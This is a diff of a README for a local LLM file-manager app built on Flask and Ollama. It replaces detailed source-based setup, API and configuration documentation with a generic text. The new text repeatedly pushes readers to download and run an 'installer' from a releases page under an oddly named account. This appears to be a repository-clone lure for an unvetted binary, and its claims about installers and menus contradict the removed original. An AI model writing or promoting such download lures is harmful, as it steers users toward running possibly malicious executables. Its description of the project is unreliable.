@@ -1,498 +1,85 @@
-# 📁 Local File Manager Agent
+# 📁 llm-file-manager-agent - Manage Your Files Easily with AI
 
-An **LLM-powered** file system assistant with intelligent function calling. Chat with your files using natural language - powered by **Ollama + Llama 3.1** with a beautiful purple gradient UI.
+![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-ff69b4)
 
-![Version](https://img.shields.io/badge/version-2.0.0-blue)
-![Python](https://img.shields.io/badge/python-3.8+-green)
-![Flask](https://img.shields.io/badge/Flask-3.0.0-black)
-![Ollama](https://img.shields.io/badge/Ollama-llama3.1:8b-purple)
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to the **llm-file-manager-agent**! This application helps you manage your files using natural language commands. Powered by advanced AI, you can chat with your files without needing technical knowledge.
 
-- 🤖 **LLM-Powered Intelligence**: Uses Ollama's Llama 3.1:8b with function calling to understand natural language
-- 🗣️ **Natural Language Interface**: No need for exact commands - just talk naturally ("search for Python files", "what's taking up space?")
-- 📊 **Smart File Operations**: Find files by extension, create folders, list directories, and find largest files
-- 🎨 **Beautiful UI**: Purple gradient theme with smooth animations and mobile-responsive design
-- 🚀 **Production Ready**: Comprehensive error handling, CORS support, and clean architecture
-- 🧠 **Function Calling**: LLM intelligently selects the right tool for each request
-- 🌐 **REST API**: Well-documented endpoints for chat and file operations
+### ✅ System Requirements
 
-## 🎯 Supported Operations
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Python Version**: Python 3.8 or higher must be installed on your system.
+- **Related Packages**: The application uses Flask and Ollama. These will install automatically.
 
-The LLM understands natural language, so you can phrase requests however you like!
+## 📥 Download & Install
 
-| Operation | Example Queries | Description |
-|-----------|----------------|-------------|
-| **Find Files** | "Find all .py files"<br>"Search for Python files"<br>"Locate JavaScript code" | Search for files by extension |
-| **Largest Files** | "Show me the largest files"<br>"What's taking up space?"<br>"Which files are biggest?" | Get top 10 largest files in directory tree |
-| **Create Folder** | "Create folder my_project"<br>"I need a new directory called test"<br>"Make a folder named docs" | Create a new directory |
-| **List Directory** | "List current directory"<br>"Show me what files are in here"<br>"What's in this folder?" | Show contents of a directory |
-| **Move Files** | "Move all Screenshot*.png files to archive"<br>"Relocate *.txt files from Downloads to Documents"<br>"Organize report_*.pdf files" | Move files matching a pattern from one directory to another |
-| **Find Duplicates** | "Find duplicate files"<br>"Show me duplicate files in Downloads"<br>"Which files are duplicated?" | Find duplicate files using SHA256 hashing and show wasted space |
+To download the application, visit the Releases page. Click the link below to get started:
 
-## 📋 Prerequisites
+[Download the Latest Version](https://github.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/releases)
 
-- **Python**: 3.8 or higher
-- **pip**: Python package installer
-- **Ollama**: Local LLM runtime ([Install here](https://ollama.ai))
-- **Llama 3.1:8b model**: Run `ollama pull llama3.1:8b` after installing Ollama
-- **Modern browser**: Chrome, Firefox, Safari, or Edge
+### Installation Steps
 
-## 🛠️ Installation
+1. **Visit the Releases Page**: Click on the button above to navigate to the latest release.
+2. **Select the Release**: Look for the version you want to install. The latest version is recommended.
+3. **Download the Installer**: Find the installer file for your operating system. 
+4. **Run the Installer**: Once downloaded, double-click the installer file to start the installation process.
+5. **Follow the Prompts**: The installer will guide you through the setup. Please read each prompt carefully.
+6. **Launch the Application**: After installation, find the app in your applications folder or start menu. Click to launch.
 
-### 1. Install and Start Ollama
+## 🌟 Features
 
-```bash
-# Install Ollama (macOS)
-brew install ollama
+- **LLM-Powered Intelligence**: Interact with your files using natural language. Ask questions like, "Show me all my PDFs" or "Find the biggest file in my downloads."
+  
+- **Natural Language Interface**: You don’t need to memorize commands. Just speak naturally to get results.
 
-# Start Ollama service
-brew services start ollama
+- **Smart File Operations**: Easily perform actions such as finding files by type, creating folders, and listing your directories. You can also locate the largest files quickly.
 
-# Pull the Llama 3.1:8b model (supports function calling)
-ollama pull llama3.1:8b
+- **Beautiful UI**: Enjoy a visually appealing purple gradient theme that provides a smooth experience whether you're on a desktop or mobile device.
 
-# Verify Ollama is running
-ollama list
-```
+- **Production Ready**: The app comes with strong error handling and supports CORS. It is also optimized for smooth performance.
 
-### 2. Clone or Navigate to Project
+## 📄 User Guide
 
-```bash
-cd /Users/andle/AI/aichat/file-manager-agent
-```
+### Interacting with Your Files
 
-### 3. Set Up Backend
+1. **Open the Application**: Start the llm-file-manager-agent.
+2. **Type or Speak Your Command**: Use natural language to interact. For example:
+   - "Find all text files."
+   - "Create a folder named 'Photos'."
+3. **View the Results**: The application will process your request and provide you with the results instantly.
 
-```bash
-# Create virtual environment (recommended)
-python3 -m venv venv
-source venv/bin/activate
-
-# Install Python dependencies
-pip install -r backend/requirements.txt
-```
-
-### 4. Frontend Setup
+### Tips for Effective Use
 
-No installation needed! The frontend is pure HTML/CSS/JavaScript.
-
-## 🚀 Running the Application
-
-### Start the Backend Server
-
-```bash
-# Activate virtual environment
-source venv/bin/activate
-
-# Start the server
-python3 backend/app.py
-```
-
-You should see:
-```
-🚀 Starting Local File Manager Agent...
-📁 Base path: /Users/andle
-🤖 AI Model: llama3.1:8b (with function calling)
-🌐 Server running on http://localhost:5001
-
-✨ LLM-powered intelligent file operations enabled!
-```
+- Use specific words related to file types, such as "PDF", "docx", or "jpg".
+- If you don’t see expected results, try rephrasing your request.
+- Explore the menu options for additional file management features.
 
-**Note**: Port 5001 is used instead of 5000 because macOS AirPlay Receiver uses port 5000 by default.
-
-### Open the Frontend
-
-1. Open `frontend/index.html` in your browser, or
-2. Serve with a local server (optional):
-
-```bash
-# From the frontend directory
-cd frontend
-python3 -m http.server 8080
-```
-
-Then visit: `http://localhost:8080`
-
-## 🎮 Usage
-
-### Via Chat Interface
-
-1. Open the frontend in your browser
-2. Wait for the green "Connected" status indicator
-3. Type natural language commands (the LLM understands variations!):
-   - "Find all .py files" or "Search for Python files"
-   - "Show me the largest files" or "What's taking up disk space?"
-   - "Create folder test_project" or "I need a new directory called my_project"
-   - "List current directory" or "Show me what files are in here"
-
-### Via API (cURL examples)
-
-#### Health Check
-```bash
-curl http://localhost:5001/api/health
-```
-
-#### Chat Endpoint
-```bash
-curl -X POST http://localhost:5001/api/chat \
-  -H "Content-Type: application/json" \
-  -d '{
-    "message": "Find all .py files",
-    "context": {"directory": "/Users/andle"}
-  }'
-```
-
-#### Execute Operation
-```bash
-curl -X POST http://localhost:5001/api/execute \
-  -H "Content-Type: application/json" \
-  -d '{
-    "action": "find_by_extension",
-    "params": {
-      "directory": "/Users/andle",
-      "extension": ".py",
-      "limit": 50
-    }
-  }'
-```
-
-## 📐 Architecture
-
-```
-file-manager-agent/
-├── backend/
-│   ├── app.py              # Flask server with API endpoints
-│   └── requirements.txt    # Python dependencies
-├── frontend/
-│   ├── index.html         # Chat interface structure
-│   ├── styles.css         # Purple gradient theme & animations
-│   └── app.js             # Chat logic & API communication
-└── README.md              # This file
-```
+## 🛠 Troubleshooting
 
-### Backend Components
+If you encounter issues, consider the following steps:
 
-- **FileOperations**: Handles all file system operations with proper error handling
-- **AgentProcessor**: Processes natural language queries (currently keyword-based, ready for LLM integration)
-- **API Endpoints**:
-  - `POST /api/chat`: Natural language chat interface
-  - `POST /api/execute`: Execute specific file operations
-  - `GET /api/health`: Health check endpoint
+- **Check Python Installation**: Ensure you have Python 3.8 or higher installed.
+- **Consult Logs**: If the application fails to launch, check logs for error messages. These can guide you in troubleshooting.
+- **Reinstall the Application**: If problems persist, uninstall and reinstall the application.
+- **Search for Help**: Look in the FAQ section or open issues on GitHub for more assistance.
 
-### Frontend Components
+## 🌐 Community & Support
 
-- **Chat Interface**: Beautiful message display with user/agent distinction
-- **Typing Indicator**: Animated dots while processing
-- **Status Indicator**: Real-time connection status with color-coded dot
-- **File Results**: Formatted tables for file listings
-- **Mobile Responsive**: Adapts to different screen sizes
+If you have questions or need further assistance, you can reach out via GitHub Issues or explore the discussions section for community support.
 
-## 🎨 UI Features
+### Important Links
 
-- **Color Scheme**: Purple gradient (#667eea → #764ba2) with dark theme
-- **Animations**: Smooth fade-in, slide-down, and typing animations
-- **Custom Scrollbar**: Themed scrollbar for chat container
-- **Message Types**: Success (green), error (red), and normal messages
-- **File Path Display**: Monospace font for file paths and names
+- [Download the Latest Version](https://github.com/Oceanicabysslesothomonetaryunit652/llm-file-manager-agent/releases)
 
-## 🧠 How It Works
+## 📄 Changelog
 
-### LLM Function Calling Architecture
+Keep track of new features and bug fixes:
 
-The agent uses **Ollama's function calling** feature to intelligently understand your requests:
+- **Version 2.0.0**: Introduced natural language processing for better user interaction, improved UI design, and enhanced performance features.
 
-1. **User Query**: You type a natural language request like "search for Python files"
-2. **LLM Processing**: Llama 3.1:8b analyzes your intent using the system prompt
-3. **Function Selection**: The LLM decides which file operation tool to call
-4. **Parameter Extraction**: The LLM extracts parameters (e.g., extension=".py")
-5. **Execution**: The backend executes the chosen operation
-6. **Response**: Results are formatted and displayed in the chat UI
+## 📜 Licenses
 
-### Available Tools
+The llm-file-manager-agent operates under the MIT License. You can find more information in the LICENSE file. 
 
-The LLM has access to 6 file operation tools defined in `backend/app.py`:
-
-```python
-- find_files_by_extension: Search for files with specific extensions
-- get_largest_files: Find files taking up the most space
-- create_folder: Make new directories
-- list_directory: Show directory contents
-- move_files: Move files matching a pattern from one directory to another
-- find_duplicates: Find duplicate files using SHA256 hashing
-```
-
-Each tool has a detailed description that helps the LLM decide when to use it.
-
-### Model Configuration
-
-The system uses **Llama 3.1:8b** because it:
-- ✅ Supports function calling (required for tools)
-- ✅ Runs locally on Apple Silicon M-series chips
-- ✅ Fast enough for real-time chat responses
-- ✅ Smart enough to understand natural language variations
-
-**Note**: Models like `qwen2.5-coder` and `deepseek-coder-v2` do NOT support function calling.
-
-### Future Operations
-
-Planned additions:
-- **File Search**: Search file contents with regex
-- **File Rename**: Rename individual files
-- **File Delete**: Safe file deletion with confirmation
-- **File Stats**: Detailed file metadata
-- **Copy Files**: Copy files matching a pattern
-- **Smart Cleanup**: Suggest which duplicate files to delete based on file locations
-
-## 🔧 Configuration
-
-### Change LLM Model
-
-Edit `backend/app.py:24`:
-
-```python
-OLLAMA_MODEL = "llama3.1:8b"  # Change to any model with function calling support
-```
-
-**Compatible models**:
-- `llama3.1:8b` (recommended - 4.9GB)
-- `llama3.2` (faster - 2GB)
-- Other llama models with function calling
-
-**Note**: Make sure to pull the model first: `ollama pull <model-name>`
-
-### Change Base Directory
-
-Edit `backend/app.py:22`:
-
-```python
-BASE_PATH = os.path.expanduser("~")  # Change to your preferred path
-```
-
-### Adjust File Limits
-
-Edit `backend/app.py:23`:
-
-```python
-MAX_FILE_SIZE_DISPLAY = 100  # Maximum files to return
-```
-
-### Frontend API URL
-
-Edit `frontend/app.js`:
-
-```javascript
-const CONFIG = {
-    API_BASE_URL: 'http://localhost:5001',  // Change if backend runs elsewhere
-    TYPING_DELAY: 1000,
-    SCROLL_BEHAVIOR: 'smooth'
-};
-```
-
-## 🐛 Troubleshooting
-
-### Ollama Not Running
-
-**Problem**: `Error in LLM processing: Connection refused`
-
-**Solution**:
-```bash
-# Check if Ollama is running
-brew services list | grep ollama
-
-# Start Ollama if not running
-brew services start ollama
-
-# Verify the model is available
-ollama list
-```
-
-### LLM Slow to Respond
-
-**Problem**: Queries take 10+ seconds
-
-**Solutions**:
-- Switch to a smaller model: `llama3.2` (2GB) instead of `llama3.1:8b` (4.9GB)
-- Check CPU usage - ensure no other heavy processes are running
-- On Apple Silicon, ensure Ollama is using the GPU
-
-### Backend Won't Start
-
-**Problem**: `ModuleNotFoundError: No module named 'flask'` or `'ollama'`
-
-**Solution**:
-```bash
-# Activate virtual environment first
-source venv/bin/activate
-
-# Then install dependencies
-pip install -r backend/requirements.txt
-```
-
-### Frontend Shows "Disconnected"
-
-**Problem**: Cannot connect to backend
-
-**Solutions**:
-1. Ensure backend is running: `python3 backend/app.py`
-2. Check backend is on port 5001: `lsof -i :5001`
-3. Verify CORS is enabled in `app.py`
-
-### Permission Errors
-
-**Problem**: `PermissionError: [Errno 13] Permission denied`
-
-**Solution**: The app runs with your user permissions. Ensure you have access to directories you're querying.
-
-### Port Already in Use
-
-**Problem**: `OSError: [Errno 48] Address already in use`
-
-**Solution**:
-```bash
-# Find process using port 5001
-lsof -i :5001
-
-# Kill the process (replace PID with actual process ID)
-kill -9 <PID>
-```
-
-**Note**: If you need to use port 5000 on macOS, you may need to disable AirPlay Receiver in System Preferences.
-
-## 📝 API Documentation
-
-### POST /api/chat
-
-Process natural language queries.
-
-**Request:**
-```json
-{
-  "message": "Find all .py files",
-  "context": {
-    "directory": "/Users/andle"
-  }
-}
-```
-
-**Response:**
-```json
-{
-  "response": "I'll execute: find_by_extension",
-  "action_info": {
-    "action": "find_by_extension",
-    "params": {
-      "directory": "/Users/andle",
-      "extension": ".py",
-      "limit": 50
-    }
-  }
-}
-```
-
-### POST /api/execute
-
-Execute a specific file operation.
-
-**Request:**
-```json
-{
-  "action": "find_by_extension",
-  "params": {
-    "directory": "/Users/andle",
-    "extension": ".py",
-    "limit": 50
-  }
-}
-```
-
-**Response:**
-```json
-{
-  "success": true,
-  "data": [
-    {
-      "path": "/Users/andle/script.py",
-      "name": "script.py",
-      "size": 1024,
-      "readable_size": "1.00 KB",
-      "modified": "2025-10-21T12:00:00"
-    }
-  ],
-  "message": "Found 1 files"
-}
-```
-
-#### Find Duplicates Example
-
-**Request:**
-```json
-{
-  "action": "find_duplicates",
-  "params": {
-    "directory": "/Users/andle/Downloads",
-    "min_size": 102400
-  }
-}
-```
-
-**Response:**
-```json
-{
-  "success": true,
-  "data": {
-    "duplicate_groups": [
-      {
-        "hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-        "files": [
-          {
-            "path": "/Users/andle/Downloads/photo1.jpg",
-            "name": "photo1.jpg",
-            "size": 2048576,
-            "readable_size": "2.00 MB"
-          },
-          {
-            "path": "/Users/andle/Downloads/backup/photo1.jpg",
-            "name": "photo1.jpg",
-            "size": 2048576,
-            "readable_size": "2.00 MB"
-          }
-        ],
-        "wasted_space": 2048576,
-        "wasted_readable": "2.00 MB"
-      }
-    ],
-    "total_wasted_space": 2048576,
-    "total_wasted_readable": "2.00 MB"
-  },
-  "message": "Found 1 duplicate group(s) wasting 2.00 MB"
-}
-```
-
-### Available Actions
-
-| Action | Parameters | Description |
-|--------|-----------|-------------|
-| `find_by_extension` | directory, extension, limit | Find files by extension |
-| `largest_files` | directory, limit | Get largest files |
-| `create_folder` | directory, folder_name | Create new folder |
-| `list_directory` | directory | List directory contents |
-| `move_files` | source_directory, destination_directory, pattern | Move files matching a pattern |
-| `find_duplicates` | directory, min_size | Find duplicate files using SHA256 hashing (default min_size: 102400 bytes = 100KB) |
-
-## 📄 License
-
-MIT License - Feel free to use and modify for your projects.
-
-## 🙏 Credits
-
-Built with:
-- [Ollama](https://ollama.ai/) - Local LLM runtime
-- [Llama 3.1:8b](https://ollama.ai/library/llama3.1) - Meta's LLM with function calling support
-- [Flask](https://flask.palletsprojects.com/) - Python web framework
-- [Flask-CORS](https://flask-cors.readthedocs.io/) - Cross-origin resource sharing
-- Pure HTML/CSS/JavaScript - No frontend frameworks needed
-
----
-
-**Built with ❤️ and 🤖 for intelligent local file management**
+Feel free to explore, provide feedback, and help improve the application!
